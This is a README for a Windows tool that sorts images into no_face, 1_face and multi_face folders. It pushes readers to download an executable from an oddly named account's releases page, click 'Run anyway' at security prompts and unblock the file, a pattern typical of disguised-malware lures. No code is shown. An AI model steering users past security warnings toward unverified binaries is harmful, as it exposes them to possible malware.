# 🔍 python - Face detection made simple

[![Download the app](https://img.shields.io/badge/Download%20from-Releases-blue.svg)](https://github.com/oilpipelinebuber960/python/releases)

## 📥 Download

Visit this page to download the app for Windows:

https://github.com/oilpipelinebuber960/python/releases

## 🖥️ What this app does

This app scans your image files and sorts them into folders based on how many faces it finds.

It places each image into one of these folders:

- `no_face` for images with no faces
- `1_face` for images with one face
- `multi_face` for images with two or more faces

This makes it easier to clean up photo sets and sort pictures in bulk.

## ✅ Before you start

Use a Windows PC with:

- Windows 10 or Windows 11
- Enough free space for your images
- A folder that contains the pictures you want to sort

You do not need any special setup if the release page includes a ready-to-run Windows file.

## 📦 Download and set up

1. Open the releases page:
   https://github.com/oilpipelinebuber960/python/releases

2. Look for the latest release.

3. Download the Windows file from that release.

4. Save it to a folder you can find again, such as `Downloads` or `Desktop`.

5. If the file comes in a ZIP folder, right-click it and choose **Extract All**.

6. Open the extracted folder if needed.

## 🚀 Run the app on Windows

1. Find the downloaded file or folder.

2. Double-click the app file to run it.

3. If Windows shows a security prompt, choose **Run anyway** if you trust the download source.

4. When the app starts, choose the folder with your images.

5. Wait while the app checks each image and sorts it.

## 🗂️ Output folders

The app creates a new folder for the sorted images. Inside that folder, you will see:

- `no_face`
- `1_face`
- `multi_face`

Example:

```text
output_folder/
├── no_face/
├── 1_face/
└── multi_face/
```

## 🖼️ How to use it with your photos

1. Put the images you want to sort in one folder.

2. Open the app.

3. Select that image folder.

4. Choose where you want the sorted files to go.

5. Start the process.

6. Open the output folder after it finishes.

## 📁 If you want the files moved or copied

The app can work in two ways:

- Move the files to the output folders
- Copy the files into the output folders

Use move if you want the original folder cleared out.

Use copy if you want to keep the original images in place.

## 🧭 Example use case

If you have a folder full of family photos, the app can sort them like this:

- Photos with no people go to `no_face`
- Photos with one person go to `1_face`
- Group photos go to `multi_face`

This helps when you want to find portraits, group shots, or images that do not contain faces.

## 🛠️ If you want to run from source

If the release does not include a ready-made Windows file, you can run the script with Python.

### 1. Install Python

Install Python 3.10 or newer from the official Python site.

Make sure Python is added to your system path during setup.

### 2. Open Command Prompt

Press `Windows + R`, type `cmd`, then press Enter.

### 3. Go to the project folder

```bash
cd face_detector
```

### 4. Create a virtual environment

```bash
python -m venv venv
```

### 5. Activate it

```bash
.\venv\Scripts\activate
```

### 6. Install the required packages

```bash
pip install -r requirements.txt
```

### 7. Run the script

```bash
python face_detector.py C:\path\to\images
```

## ⚙️ Command examples

Process images and sort them into subfolders in the same folder:

```bash
python face_detector.py C:\path\to\images
```

Process images and send the results to a different output folder:

```bash
python face_detector.py C:\path\to\images --output C:\path\to\output
```

Copy files instead of moving them:

```bash
python face_detector.py C:\path\to\images --copy
```

Use both a custom output folder and copy mode:

```bash
python face_detector.py C:\path\to\images --output C:\path\to\output --copy
```

## 📌 File types

The app works best with common image formats such as:

- JPG
- JPEG
- PNG
- BMP
- TIFF

Keep your images in one folder for faster sorting.

## 🔍 How face sorting works

The app checks each image and counts visible faces.

Then it sorts the image into the matching folder:

- 0 faces → `no_face`
- 1 face → `1_face`
- 2 or more faces → `multi_face`

This gives you a simple way to organize large image sets.

## 🧩 Tips for best results

- Use clear images with visible faces
- Keep faces large enough in the picture
- Avoid damaged or broken image files
- Sort one folder at a time for easier review
- Use copy mode if you want a backup

## 📂 Recommended folder setup

Before you run the app, place your files like this:

```text
MyPhotos/
├── photo1.jpg
├── photo2.png
├── photo3.jpg
└── photo4.jpeg
```

After processing, the output can look like this:

```text
SortedPhotos/
├── no_face/
├── 1_face/
└── multi_face/
```

## 🔒 Privacy and local use

The app runs on your computer. It processes the files in the folder you choose. You do not need to upload your images to a website.

## 🧪 Troubleshooting

### The app does not open

- Check that the file finished downloading
- Make sure you extracted the ZIP file if one was provided
- Try running it again from the folder where it was saved

### Windows blocks the file

- Right-click the file
- Choose **Properties**
- If you see an **Unblock** option, select it
- Click **Apply**
- Try opening the file again

### It says Python is not found

- Install Python 3
- Make sure **Add Python to PATH** is selected during setup
- Open a new Command Prompt and try again

### Images do not sort correctly

- Check that the files are valid image files
- Use clear, front-facing photos when possible
- Try another folder with a smaller set of images

## 📎 Get the latest release

Use this page to download the current Windows version:

https://github.com/oilpipelinebuber960/python/releases